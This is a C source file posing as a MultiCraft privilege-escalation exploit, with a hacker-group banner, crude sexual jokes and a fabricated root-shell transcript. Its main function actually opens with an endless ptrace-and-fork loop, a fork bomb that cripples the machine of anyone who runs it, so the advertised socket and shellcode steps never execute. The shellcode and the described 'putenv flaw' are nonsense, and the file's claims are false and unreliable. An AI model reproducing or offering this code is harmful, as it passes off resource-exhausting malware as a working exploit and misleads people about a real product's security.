/*
           --[+]An1m3b1tch3z[+]--
  $vai $vai $vai $vai $vai $vai $vai $vai $vai $vai $vai
            n3w exploit f0r mulicraft
            privelege escelation
  $vai $vai $vai $vai $vai $vai $vai $vai $vai $vai $vai
 
 
    Just compile the script
    ./giantdongs 1000 25465
    takes about 13 minutes to run because timeout->tv_sec is decremented once per second and 0xff*3 is 765.
        * some things you could do while waiting:
        * watch https://www.youtube.com/watch?v=t2we10nvE7A
        * watch https://www.youtube.com/watch?v=UX44ugzaqw4 $VAI $VAI $VAI $VAI
        * mastrubate to anime
    w00t w00t g0t r00t sh3ll!!!!
    # id
    uid=0(root) gid=25465(395231) groups=25465(395231)
    #free -g
                 total       used       free     shared    buffers     cached
    Mem:           104         74          30          0          0          1
    -/+ buffers/cache:          0          1
    Swap:          512        171        341
    #
    #
    # Thanks for free server.
    Thanks: command not found




  */
 
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
 
#define __3L23123_ASS(...) printf(__VA_ARGS__)
void us4g3(char *argv[])
{
    __3L23123_ASS("\n\t[+] An1m3B1tch3z release\n");
    __3L23123_ASS("\t[+] MultiCraft privlege escalation exploit\n");
    __3L23123_ASS("\t[+] usage: %s <user id> <port of deamon>\n\n", argv[0]); // we are working on a remote version, it is possible but needs work.
    exit(1);
}
 

/* 

Abuse a flaw in which multicraft handles enviorment variables

    root@NYAAbox:~/multicraft/bin# objdump -d multicraft  | grep putenv
    0000000000401610 <putenv@plt>:
      401bd0:       e8 3b fa ff ff          callq  401610 <putenv@plt>
      4032e3:       e8 28 e3 ff ff          callq  401610 <putenv@plt>
      40332a:       e8 e1 e2 ff ff          callq  401610 <putenv@plt>


0xffffcd468e can be abused and give us root permisions
*/

// added SELinux bypass, bypass grsec yourself.
unsigned char sh3llc0d3[] =
               "\x0f\x01\xf8\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"      
                "\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0"                                  
                "\x0f\x01\xf8"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x48\xcf";
 
int main(int argc, char **argv)
{
 
    int id = geteuid();
    int port= 25465, sock;
    char h[1000];
    struct passwd *p = getpwuid(id);
    struct sockaddr_in addr;

    addr.sin_addr.s_addr = htonl(INADDR_ANY);

  if(argc != 3){
        us4g3(argv);
    }
    __3L23123_ASS("takes about 13 minutes to run because timeout->tv_sec is decremented once per second and 0xff*3 is 765.");
    __3L23123_ASS("\n\t* some things you could do while waiting:");
    __3L23123_ASS("\n\t* watch https://www.youtube.com/watch?v=t2we10nvE7A");
    __3L23123_ASS("\n\t* watch https://www.youtube.com/watch?v=UX44ugzaqw4 $VAI $VAI $VAI $VAI")
    __3L23123_ASS("\n\t* mastrubate to anime");

    sock = socket(PF_INET, SOCK_STREAM, 0);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
   
    while (1){
        ptrace(PT_TRACE_ME, NULL, NULL, NULL);
        fork();
    }
    if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==-1)  //cheks if address is legiement
    {
        __3L23123_ASS(stderr,"!!! Un4bl3 t0 pr4c3 4ddr3ss.\n");
        exit(1);
    }
    send(sock, sh3llc0d3, strlen(sh3llc0d3),0);                 //pushes the shellcode down the pipe and executes our little exploit
    close(sock);                                                // we don't need this anymore.
    if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==0)
    {
        if(getuid() == 0)                                       //checks if we are UID 0 aka r00t
        {
                __3L23123_ASS(stdout, "w00t w00t g0t r00t sh3ll!!!!\n");
                system("/bin/sh");
        }
    }
    else
    {
        __3L23123_ASS(stderr, "[-] Exploit failed.\n");
        close(sock);
    }
}
